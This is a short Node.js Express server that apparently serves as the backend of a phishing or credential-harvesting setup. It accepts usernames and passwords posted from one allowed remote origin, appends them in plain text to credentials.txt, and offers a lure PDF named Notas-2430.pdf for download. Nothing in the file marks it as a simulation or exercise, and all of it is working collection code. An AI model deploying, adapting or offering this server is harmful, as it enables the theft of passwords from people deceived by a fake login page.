const cors = require('cors');
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || 4000;

// Allow CORS for specific origin (IIS server)
app.use(cors({
    origin: 'http://192.168.124.1:443',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type'],
}));

app.options('*', cors());

app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));

app.post('/save-credentials', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ message: 'Username and password are required.' });
    }

    const data = `Username: ${username}, Password: ${password}\n`;

    fs.appendFile('credentials.txt', data, (err) => {
        if (err) {
            console.error('Error saving to file:', err);
            return res.status(500).json({ message: 'Error saving credentials.' });
        }

        res.status(200).json({ message: 'Credentials saved successfully.' });
    });
});

app.get('/download-file', (req, res) => {
    const filePath = path.join(__dirname, 'Notas-2430.pdf'); 
    console.log('Attempting to download:', filePath); 

    res.download(filePath, 'Notas-2430.pdf', (err) => {
        if (err) {
            console.error('Error sending file:', err);
            res.status(500).send('Error downloading file.');
        }
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
